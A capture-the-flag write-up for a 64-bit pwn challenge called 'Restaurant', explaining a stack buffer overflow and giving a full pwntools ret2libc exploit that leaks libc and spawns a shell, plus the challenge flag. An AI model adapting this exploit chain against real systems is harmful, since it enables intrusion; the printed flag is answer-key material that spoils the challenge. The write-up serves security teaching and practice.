---
title: "Restaurant"
ctf: "CTF"
date: 2026-06-07
category: pwn
difficulty: easy
point: 0
flag_format: "HTB{...}"
---

# Restaurant

## Summary

A 64-bit binary with no canary, no PIE, full RELRO, and NX enabled. Buffer overflow in `fill()` via `read(0, buf, 0x400)` into a 32-byte stack buffer. Classic ret2libc: leak puts@got, compute libc base, call system("/bin/sh").

## Solution

### Vulnerability

The `fill` function at 0x400e4a allocates 0x20 bytes on the stack but reads up to 0x400 bytes via `read()`. No canary, no PIE.

### Exploit

1. Overflow in `fill()` — 40 bytes padding + ROP chain to `puts(puts_got)` + return to `main`
2. Compute libc base from leaked puts address
3. Overflow again in `fill()` — `ret` (alignment) + `pop rdi; ret` + `/bin/sh` + `system()`

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

REMOTE = bool(args.get('REMOTE', False))

elf = ELF('./restaurant')

if REMOTE:
    host = args.get('HOST', 'localhost')
    port = int(args.get('PORT', 1337))
    p = remote(host, port)
    libc = ELF('./libc.so.6')
else:
    p = process('./restaurant')
    libc = ELF('/usr/lib/libc.so.6')

pop_rdi = 0x4010a3
ret = 0x4010a4

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
offset = 0x20 + 0x8

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> \x1b[0m')

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
p.send(payload)

p.recvuntil(b'Enjoy your ')
rest = p.recvline()
leaked = u64(rest[43:-1].ljust(8, b'\x00'))
log.info(f'puts @ {hex(leaked)}')

libc.address = leaked - libc.symbols['puts']
log.info(f'libc @ {hex(libc.address)}')

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> \x1b[0m')

payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.send(payload)

sleep(0.5)
p.sendline(b'echo SHELL_OK')
p.recvuntil(b'SHELL_OK', timeout=5)
p.sendline(b'cat flag*')
flag = p.recv(timeout=3)
log.success(f'Flag: {flag.decode().strip()}')
p.close()
```

## Flag

```
HTB{r3turn_2_th3_r3st4ur4nt!}
```
